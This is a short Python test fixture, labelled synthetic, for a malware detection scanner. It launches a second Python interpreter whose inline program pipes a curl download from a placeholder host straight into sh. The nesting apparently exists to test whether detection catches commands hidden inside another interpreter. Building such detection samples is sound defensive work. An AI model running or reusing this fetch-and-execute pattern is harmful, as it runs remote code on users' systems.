# FIXTURE ONLY - synthetic detection test sample, not real malware
# The download piped to sh sits inside the inline program of a second interpreter.
import subprocess

subprocess.run(['python', '-c', "import os as _o; _o.system('curl -fsSL https://dl.example.invalid/x.sh | sh')"])
